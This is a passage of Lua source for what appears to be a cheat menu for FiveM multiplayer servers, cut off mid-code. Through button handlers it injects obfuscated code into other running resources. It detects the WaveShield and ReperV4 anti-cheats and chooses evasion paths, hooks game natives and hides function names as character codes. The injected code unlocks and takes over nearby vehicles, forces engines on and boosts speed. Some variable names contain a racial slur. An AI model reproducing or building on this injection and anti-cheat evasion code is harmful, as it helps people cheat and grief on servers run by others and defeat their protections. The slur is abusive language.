                            values = { "blade", "brigham", "broadway", "buccaneer", "buccaneer2", "buffalo4", "buffalo5", "chino", "chino2", "clique", "clique2", "coquette3", "deviant", "dominator", "dominator2", "dominator3", "dominator4", "dominator5", "dominator6", "dominator7", "dominator8", "dominator9", "driftdominator10", "driftyosemite", "dukes", "dukes2", "dukes3", "ellie", "eudora", "faction", "faction2", "faction3", "gauntlet", "gauntlet2", "gauntlet3", "gauntlet4", "gauntlet5", "driftgauntlet4", "greenwood", "hermes", "hotknife", "hustler", "impaler", "impaler2", "impaler3", "impaler4", "impaler6", "imperator", "imperator2", "imperator3", "lurcher", "manana2", "moonbeam", "moonbeam2", "nightshade", "peyote2", "phoenix", "picador", "ratloader", "ratloader2", "ruiner", "ruiner2", "ruiner3", "ruiner4", "sabregt", "sabregt2", "slamvan", "slamvan2", "slamvan3", "slamvan4", "slamvan5", "slamvan6", "stalion", "stalion2", "tahoma", "tampa", "tampa3", "tampa4", "tulip", "tulip2", "vamos", "vigero", "vigero2", "vigero3", "virgo", "virgo2", "virgo3", "voodoo", "voodoo2", "weevil2", "yosemite", "yosemite2" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Sports Classic",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "ardent", "btype", "btype2", "btype3", "casco", "cheburek", "cheetah2", "cheetah3", "coquette2", "deluxo", "dynasty", "fagaloa", "feltzer3", "gt500", "infernus2", "jb700", "jb7002", "mamba", "manana", "michelli", "monroe", "nebula", "peyote", "peyote3", "pigalle", "rapidgt3", "retinue", "retinue2", "savestra", "stinger", "stingergt", "stromberg", "swinger", "toreador", "torero", "tornado", "tornado2", "tornado3", "tornado4", "tornado5", "tornado6", "turismo2", "viseris", "z190", "zion3", "ztype" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Sports",
                            type = "scrollable",
                            value = 1,
                            values = { "alpha", "banshee", "bestiagts", "blista2", "blista3", "buffalo", "buffalo2", "buffalo3", "calico", "carbonizzare", "comet2", "comet3", "comet4", "comet5", "comet6", "comet7", "coquette", "coquette4", "corsita", "coureur", "cypher", "drafter", "drifteuros", "driftfuto", "driftjester", "driftremus", "drifttampa", "driftzr350", "elegy", "elegy2", "euros", "everon2", "feltzer2", "flashgt", "furoregt", "fusilade", "futo", "futo2", "gauntlet6", "gb200", "growler", "hotring", "imorgon", "issi7", "italigto", "italirsx", "jester", "jester2", "jester3", "jester4", "jugular", "khamelion", "komoda", "kuruma", "kuruma2", "locust", "lynx", "massacro", "massacro2", "neo", "neon", "ninef", "ninef2", "omnis", "omnisegt", "panthere", "paragon", "paragon2", "pariah", "penumbra", "penumbra2", "r300", "raiden", "rapidgt", "rapidgt2", "rapidgt4", "raptor", "remus", "revolter", "rt3000", "ruston", "schafter3", "schafter4", "schlagen", "schwarzer", "sentinel3", "sentinel4", "sentinel5", "seven70", "sm722", "specter", "specter2", "stingertt", "streiter", "sugoi", "sultan", "sultan2", "sultan3", "surano", "tampa2", "tenf", "tenf2", "tropos", "vectre", "verlierer2", "veto", "veto2", "vstr", "zr350", "zr380", "zr3802", "zr3803" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Super",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "adder", "autarch", "banshee2", "bullet", "champion", "cheetah", "cyclone", "deveste", "emerus", "entity2", "entity3", "entityxf", "fmj", "furia", "gp1", "ignus", "infernus", "italigtb", "italigtb2", "krieger", "le7b", "lm87", "nero", "nero2", "osiris", "penetrator", "pfister811", "prototipo", "reaper", "s80", "sc1", "scramjet", "sheava", "sultanrs", "suzume", "t20", "taipan", "tempesta", "tezeract", "thrax", "tigon", "torero2", "turismo3", "turismor", "tyrant", "tyrus", "vacca", "vagner", "vigilante", "virtue", "visione", "voltic", "voltic2", "xa21", "zeno", "zentorno", "zorrusso" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Motorcycles",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "akuma", "avarus", "bagger", "bati", "bati2", "bf400", "carbonrs", "chimera", "cliffhanger", "daemon", "daemon2", "deathbike", "deathbike2", "deathbike3", "defiler", "diablous", "diablous2", "double", "enduro", "esskey", "faggio", "faggio2", "faggio3", "fcr", "fcr2", "gargoyle", "hakuchou", "hakuchou2", "hexer", "innovation", "lectro", "manchez", "manchez2", "manchez3", "nemesis", "nightblade", "oppressor", "oppressor2", "pcj", "powersurge", "ratbike", "reever", "rrocket", "ruffian", "sanchez", "sanchez2", "sanctus", "shinobi", "shotaro", "sovereign", "stryder", "thrust", "vader", "vindicator", "vortex", "wolfsbane", "zombiea", "zombieb" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Off-Road",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "bfinjection", "bifta", "blazer", "blazer2", "blazer3", "blazer4", "blazer5", "bodhi2", "boor", "brawler", "bruiser", "bruiser2", "bruiser3", "brutus", "brutus2", "brutus3", "caracara", "caracara2", "dloader", "draugur", "driftl352", "dubsta3", "dune", "dune2", "dune3", "dune4", "dune5", "freecrawler", "hellion", "insurgent", "insurgent2", "insurgent3", "kalahari", "kamacho", "l35", "l352", "marshall", "menacer", "mesa3", "monster", "monster3", "monster4", "monster5", "monstrociti", "nightshark", "outlaw", "patriot3", "rancherxl", "rancherxl2", "ratel", "rcbandito", "rebel", "rebel2", "riata", "sandking", "sandking2", "technical", "technical2", "technical3", "terminus", "trophytruck", "trophytruck2", "vagrant", "verus", "winky", "yosemite3", "zhaba" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Industrial",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "bulldozer", "cutter", "dump", "flatbed", "flatbed2", "guardian", "handler", "mixer", "mixer2", "rubble", "tiptruck", "tiptruck2" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Utility",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "airtug", "armytanker", "armytrailer", "armytrailer2", "baletrailer", "boattrailer", "boattrailer2", "boattrailer3", "caddy", "caddy2", "caddy3", "docktrailer", "docktug", "forklift", "freighttrailer", "graintrailer", "mower", "proptrailer", "raketrailer", "ripley", "sadler", "sadler2", "scrap", "slamtruck", "tanker", "tanker2", "towtruck", "towtruck2", "towtruck3", "towtruck4", "tr2", "tr3", "tr4", "tractor", "tractor2", "tractor3", "trailerlarge", "trailerlogs", "trailers", "trailers2", "trailers3", "trailers4", "trailers5", "trailersmall", "trflat", "tvtrailer", "tvtrailer2", "utillitruck", "utillitruck2", "utillitruck3" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                        {
                            icon = "ph ph-car",
                            label = "Vans",
                            type = "scrollable",
                            scrollType = "onEnter",
                            value = 1,
                            values = { "bison", "bison2", "bison3", "bobcatxl", "boxville", "boxville2", "boxville3", "boxville4", "boxville5", "boxville6", "burrito", "burrito2", "burrito3", "burrito4", "burrito5", "camper", "gburrito", "gburrito2", "journey", "journey2", "minivan", "minivan2", "paradise", "pony", "pony2", "rumpo", "rumpo2", "rumpo3", "speedo", "speedo2", "speedo4", "speedo5", "surfer", "surfer2", "surfer3", "taco", "youga", "youga2", "youga3", "youga4" },
                            onSelect = function(selected)
                                self:SpawnSelectedVehicle(selected, TeleportInto, DeletePrevious)
                            end
                        },
                    }
                },
                {
                    label = "Vehicle Customization",
                    tabs = {
                        -- { type = "button", label = "test button",
                        --     onSelect = function()
                        --         self:RepairVehicle()
                        --     end
                        -- },

                    -- { type = "checkbox", label = "Test", checked = false,
                    --     onSelect = function(checked)
                    --         if checked then
                    --             print("on")
                    --         else
                    --             print("off")
                    --         end
                    --     end
                    -- },
                        {
                            type = "button",
                            label = "Set License Plate",
                            onSelect = function()
                                KeyboardInput("Set License Plate", "", function(val)
                                    if val and val ~= "" then
                                        local injectedCode = string.format([[
                                            local function xKqLZVwPt9()
                                                local XcVbNmAsDfGhJkL = PlayerPedId
                                                local TyUiOpZxCvBnMzLk = GetVehiclePedIsIn
                                                local PoIuYtReWqAzXsDc = _G.SetVehicleNumberPlateText

                                                local pEd = XcVbNmAsDfGhJkL()
                                                local vEh = TyUiOpZxCvBnMzLk(pEd, false)

                                                if vEh and vEh ~= 0 then
                                                    PoIuYtReWqAzXsDc(vEh, "%s")
                                                end
                                            end

                                            xKqLZVwPt9()
                                        ]], val)

                                        MachoInjectResourceRaw("any", injectedCode)
                                    else
                                        OSINT:Notify("Invalid input", "Please enter a valid license plate.", "error")
                                    end
                                end, "typeable")
                            end
                        },
                        { type = "button", label = "Repair Vehicle",
                            onSelect = function()
                                self:RepairVehicle()
                            end
                        },
                        { type = "button", label = "Clean Vehicle",
                            onSelect = function()
                            OSINT:Notify("success", "OSINT", "Cleaned Vehicle", 3000)
                            MachoInjectResourceRaw("any", [[
                            local function qPwRYKz7mL()
                                local a = PlayerPedId
                                local b = GetVehiclePedIsIn
                                local c = SetVehicleDirtLevel

                                local ped = a()
                                local veh = b(ped, false)
                                if veh and veh ~= 0 then
                                    c(veh, 0.0)
                                end
                            end

                            qPwRYKz7mL()
                            ]])
                            end
                        },
                        { type = "button", label = "Force Vehicle Engine",
                            onSelect = function()
                            Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsTryingToEnter", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInVehicle", function(originalFn, ...) return originalFn(...) end)
                                hNative("IsPedInVehicle", function(originalFn, ...) return false end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return false end)
                                hNative("SetVehicleKeepEngineOnWhenAbandoned", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                if GhYtReFdCxWaQzLp == nil then GhYtReFdCxWaQzLp = false end
                                GhYtReFdCxWaQzLp = true

                                local function OpAsDfGhJkLzXcVb()
                                    local lMnbVcXzZaSdFg = CreateThread
                                    lMnbVcXzZaSdFg(function()
                                        local QwErTyUiOp         = _G.PlayerPedId
                                        local AsDfGhJkLz         = _G.GetVehiclePedIsIn
                                        local TyUiOpAsDfGh       = _G.GetVehiclePedIsTryingToEnter
                                        local ZxCvBnMqWeRtYu     = _G.SetVehicleEngineOn
                                        local ErTyUiOpAsDfGh     = _G.SetVehicleUndriveable
                                        local KeEpOnAb           = _G.SetVehicleKeepEngineOnWhenAbandoned
                                        local En_g_Health_Get    = _G.GetVehicleEngineHealth
                                        local En_g_Health_Set    = _G.SetVehicleEngineHealth
                                        local En_g_Degrade_Set   = _G.SetVehicleEngineCanDegrade
                                        local No_Hotwire_Set     = _G.SetVehicleNeedsToBeHotwired

                                        local function _tick(vh)
                                            if vh and vh ~= 0 then
                                                No_Hotwire_Set(vh, false)
                                                En_g_Degrade_Set(vh, false)
                                                ErTyUiOpAsDfGh(vh, false)
                                                KeEpOnAb(vh, true)

                                                local eh = En_g_Health_Get(vh)
                                                if (not eh) or eh < 300.0 then
                                                    En_g_Health_Set(vh, 900.0)
                                                end

                                                ZxCvBnMqWeRtYu(vh, true, true, true)
                                            end
                                        end

                                        while GhYtReFdCxWaQzLp and not Unloaded do
                                            local p  = QwErTyUiOp()

                                            _tick(AsDfGhJkLz(p, false))
                                            _tick(TyUiOpAsDfGh(p))
                                            _tick(AsDfGhJkLz(p, true))

                                            Wait(0)
                                        end
                                    end)
                                end

                                OpAsDfGhJkLzXcVb()
                            ]])
                        end, function()
                            Injection(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[

                                function hNative(nativeName, newFunction)
                                    local originalNative = _G[nativeName]
                                    if not originalNative or type(originalNative) ~= "function" then
                                        return
                                    end

                                    _G[nativeName] = function(...)
                                        return newFunction(originalNative, ...)
                                    end
                                end

                                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsTryingToEnter", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineOn", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleUndriveable", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleKeepEngineOnWhenAbandoned", function(originalFn, ...) return originalFn(...) end)
                                hNative("GetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineHealth", function(originalFn, ...) return originalFn(...) end)
                                hNative("SetVehicleEngineCanDegrade", function(originalFn, ...) return originalFn(...) end)
                                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                                GhYtReFdCxWaQzLp = false
                                local v = GetVehiclePedIsIn(PlayerPedId(), false)
                                if v and v ~= 0 then
                                    SetVehicleKeepEngineOnWhenAbandoned(v, false)
                                    SetVehicleEngineCanDegrade(v, true)
                                    SetVehicleUndriveable(v, false)
                                end
                            ]])
                            end
                        },
                        { type = "button", label = "Max Upgrade",
                            onSelect = function()
                            OSINT:Notify("success", "OSINT", "Vehicle Max Upgraded", 3000)
                            local WaveNiggaStarted = GetResourceState("WaveShield") == 'started'
                            local ReaperNiggaStarted = GetResourceState("ReaperV4") == 'started'
                            if WaveNiggaStarted then
                            print("WaveNiggaStarted")
                            MachoInjectResourceRaw("any", [[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]])
                            elseif ReaperNiggaStarted then
                            print("using Reaper fallback")
                            MachoInjectThread(0, "any", "", [[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]])
                        else
                            MachoInjectResourceRaw("any", [[
                                local function XzPmLqRnWyBtVkGhQe()
                                    local FnUhIpOyLkTrEzSd = PlayerPedId
                                    local VmBgTnQpLcZaWdEx = GetVehiclePedIsIn
                                    local RfDsHuNjMaLpOyBt = SetVehicleModKit
                                    local AqWsEdRzXcVtBnMa = SetVehicleWheelType
                                    local TyUiOpAsDfGhJkLz = GetNumVehicleMods
                                    local QwErTyUiOpAsDfGh = SetVehicleMod
                                    local ZxCvBnMqWeRtYuIo = ToggleVehicleMod
                                    local MnBvCxZaSdFgHjKl = SetVehicleWindowTint
                                    local LkJhGfDsQaZwXeCr = SetVehicleTyresCanBurst
                                    local UjMiKoLpNwAzSdFg = SetVehicleExtra
                                    local RvTgYhNuMjIkLoPb = DoesExtraExist

                                    local lzQwXcVeTrBnMkOj = FnUhIpOyLkTrEzSd()
                                    local jwErTyUiOpMzNaLk = VmBgTnQpLcZaWdEx(lzQwXcVeTrBnMkOj, false)
                                    if not jwErTyUiOpMzNaLk or jwErTyUiOpMzNaLk == 0 then return end

                                    RfDsHuNjMaLpOyBt(jwErTyUiOpMzNaLk, 0)
                                    AqWsEdRzXcVtBnMa(jwErTyUiOpMzNaLk, 7)

                                    for XyZoPqRtWnEsDfGh = 0, 16 do
                                        local uYtReWqAzXsDcVf = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh)
                                        if uYtReWqAzXsDcVf and uYtReWqAzXsDcVf > 0 then
                                            QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, XyZoPqRtWnEsDfGh, uYtReWqAzXsDcVf - 1, false)
                                        end
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 14, 16, false)

                                    local aSxDcFgHiJuKoLpM = TyUiOpAsDfGhJkLz(jwErTyUiOpMzNaLk, 15)
                                    if aSxDcFgHiJuKoLpM and aSxDcFgHiJuKoLpM > 1 then
                                        QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 15, aSxDcFgHiJuKoLpM - 2, false)
                                    end

                                    for QeTrBnMkOjHuYgFv = 17, 22 do
                                        ZxCvBnMqWeRtYuIo(jwErTyUiOpMzNaLk, QeTrBnMkOjHuYgFv, true)
                                    end

                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 23, 1, false)
                                    QwErTyUiOpAsDfGh(jwErTyUiOpMzNaLk, 24, 1, false)

                                    for TpYuIoPlMnBvCxZq = 1, 12 do
                                        if RvTgYhNuMjIkLoPb(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq) then
                                            UjMiKoLpNwAzSdFg(jwErTyUiOpMzNaLk, TpYuIoPlMnBvCxZq, false)
                                        end
                                    end

                                    MnBvCxZaSdFgHjKl(jwErTyUiOpMzNaLk, 1)
                                    LkJhGfDsQaZwXeCr(jwErTyUiOpMzNaLk, false)
                                end

                                XzPmLqRnWyBtVkGhQe()
                            ]])
                            end
                        end
                        },
                        { type = "button", label = "Delete Vehicle",
                            onSelect = function()
                            OSINT:Notify("success", "OSINT", "Deleted Vehicle", 3000)
                            MachoInjectResourceRaw("any", [[
                            local function LXpTqWvR80()
                                local aQw = PlayerPedId
                                local bEr = GetVehiclePedIsIn
                                local cTy = DoesEntityExist
                                local dUi = NetworkHasControlOfEntity
                                local eOp = SetEntityAsMissionEntity
                                local fAs = DeleteEntity
                                local gDf = DeleteVehicle
                                local hJk = SetVehicleHasBeenOwnedByPlayer

                                local ped = aQw()
                                local veh = bEr(ped, false)

                                if veh and veh ~= 0 and cTy(veh) then
                                    hJk(veh, true)
                                    eOp(veh, true, true)

                                    if dUi(veh) then
                                        fAs(veh)
                                        gDf(veh)
                                    end
                                end

                            end

                            LXpTqWvR80()
                            ]])
                            end
                        },
                        { type = "button", label = "Unlock Closest Vehicle",
                            onSelect = function()
                            OSINT:Notify("success", "OSINT", "Deleted Vehicle", 3000)
                            MachoInjectResourceRaw("any", [[
                            local function TpLMqKtXwZ()
                                local AsoYuTrBnMvCxZaQw = PlayerPedId
                                local GhrTnLpKjUyVbMnZx = GetEntityCoords
                                local UyeWsDcXzQvBnMaLp = GetClosestVehicle
                                local ZmkLpQwErTyUiOpAs = DoesEntityExist
                                local VczNmLoJhBgVfCdEx = SetEntityAsMissionEntity
                                local EqWoXyBkVsNzQuH = SetVehicleDoorsLocked
                                local YxZwQvTrBnMaSdFgHj = SetVehicleDoorsLockedForAllPlayers
                                local RtYuIoPlMnBvCxZaSd = SetVehicleHasBeenOwnedByPlayer
                                local LkJhGfDsAzXwCeVrBt = NetworkHasControlOfEntity

                                local ped = AsoYuTrBnMvCxZaQw()
                                local coords = GhrTnLpKjUyVbMnZx(ped)
                                local veh = UyeWsDcXzQvBnMaLp(coords.x, coords.y, coords.z, 10.0, 0, 70)

                                if veh and ZmkLpQwErTyUiOpAs(veh) and LkJhGfDsAzXwCeVrBt(veh) then
                                    VczNmLoJhBgVfCdEx(veh, true, true)
                                    RtYuIoPlMnBvCxZaSd(veh, true)
                                    EqWoXyBkVsNzQuH(veh, 1)
                                    YxZwQvTrBnMaSdFgHj(veh, false)
                                end

                            end

                            TpLMqKtXwZ()
                            ]])
                            end
                        },
                        { type = "button", label = "Teleport into Closest Vehicle",
                            onSelect = function()
                            OSINT:Notify("success", "OSINT", "Teleported into Vehicle", 3000)
                            MachoInjectResourceRaw(GetResourceState("monitor") == "started" and "monitor" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                            function hNative(nativeName, newFunction)
                                local originalNative = _G[nativeName]
                                if not originalNative or type(originalNative) ~= "function" then
                                    return
                                end

                                _G[nativeName] = function(...)
                                    return newFunction(originalNative, ...)
                                end
                            end

                            hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                            hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetClosestVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("SetVehicleForwardSpeed", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                            hNative("IsPedInAnyVehicle", function(originalFn, ...) return originalFn(...) end)
                            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                            hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)

                            local function uPKcoBaEHmnK()
                                local ziCFzHyzxaLX = SetPedIntoVehicle
                                local YPPvDlOGBghA = GetClosestVehicle

                                local Coords = GetEntityCoords(PlayerPedId())
                                local vehicle = YPPvDlOGBghA(Coords.x, Coords.y, Coords.z, 15.0, 0, 70)

                                if DoesEntityExist(vehicle) and not IsPedInAnyVehicle(PlayerPedId(), false) then
                                    if GetPedInVehicleSeat(vehicle, -1) == 0 then
                                        ziCFzHyzxaLX(PlayerPedId(), vehicle, -1)
                                    else
                                        ziCFzHyzxaLX(PlayerPedId(), vehicle, 0)
                                    end
                                end
                            end

                            uPKcoBaEHmnK()
                            ]])
                            end
                        },
                        { type = "divider", label = "Toggles" },
                        {
                            type = "checkbox",
                            label = "Boost Vehicle",
                            checked = false,
                            onSelect = function(checked)
                                if checked then
                                    OSINT:Notify("success", "OSINT", "Boost Vehicle On", 3000)

                                    if GetResourceState("WaveShield") == "started" then
                                        Injection(GetResourceState("WaveShield") == "started" and "WaveShield" or GetResourceState("ox_lib") == "started" and "ox_lib" or "any", [[
                                            local function decode(tbl)
                                                local s = ""
                                                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                                                return s
                                            end

                                            local function g(n)
                                                return _G[decode(n)]
                                            end

                                            if not _G.superSpeedBoost then
                                                _G.superSpeedBoost = true

                                                local PlayerPedId_fn       = g({80,108,97,121,101,114,80,101,100,73,100})
                                                local GetVehiclePedIsIn_fn = g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})
                                                local IsPedInAnyVehicle_fn = g({73,115,80,101,100,73,110,65,110,121,86,101,104,105,99,108,101})
                                                local IsControlPressed_fn  = g({73,115,67,111,110,116,114,111,108,80,114,101,115,115,101,100})
                                                local SetVehicleForwardSpeed_fn = g({83,101,116,86,101,104,105,99,108,101,70,111,114,119,97,114,100,83,112,101,101,100})
                                                local Wait_fn              = g({87,97,105,116})

                                                _G.superSpeedBoostEnabled = true

                                                local function initFlow(cb)
                                                    local co = coroutine.create(cb)
                                                    local function execCycle()
                                                        while coroutine.status(co) ~= "dead" do
                                                            local ok, err = coroutine.resume(co)
                                                            if not ok then
                                                                print("^1[SuperSpeedBoost] Coroutine error: ^7", err)
                                                                break
                                                            end
                                                            Wait_fn(0)
                                                        end
                                                    end
                                                    execCycle()
                                                end

                                                initFlow(function()
